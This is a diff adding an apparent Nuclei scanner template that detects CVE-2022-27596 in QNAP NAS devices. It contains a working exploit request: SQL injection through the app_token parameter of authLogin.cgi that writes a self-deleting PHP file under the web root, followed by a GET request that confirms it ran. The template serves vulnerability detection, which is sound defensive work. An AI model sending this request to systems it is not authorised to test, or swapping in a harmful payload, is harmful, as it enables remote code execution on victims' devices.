@@ -1,0 +1,48 @@
+id: qnap-nas-authlogin-rce
+info:
+  name: QNAP-NAS authLogin.cgi app_token RCE Vulnerability (CVE-2022-27596)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    QNAP Systems QTS allows remote attackers to inject malicious code into the app_token parameter field to obtain server permissions.
+  reference:
+    - https://www.qnap.com.cn/zh-cn/security-advisory/qsa-23-01
+  classification:
+    cve-id: CVE-2022-27596
+    cvss-score: 9.0
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+
+variables:
+  random_str: '{{rand_text_alphanumeric(6)}}'
+  filename: '{{random_str}}.php'
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/authLogin.cgi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+        Content-Type: application/x-www-form-urlencoded
+
+        app=MUSIC_STATION&app_token=123';ATTACH+DATABASE+'/share/CACHEDEV1_DATA/.qpkg/musicstation/{{filename}}'+AS+qnapkey%3bCREATE+TABLE+qnapkey.key+(dataz+text)%3bINSERT+INTO+qnapkey.key+(dataz)+VALUES+("<?php echo(md5('{{random_str}}'));unlink(__FILE__); ?>")%3b--&sid=1&client_app=1&client_agent=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "application/json"
+  - raw:
+      - |
+        GET /musicstation/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{md5(random_str)}}"
+      - type: status
+        status:
+          - 200
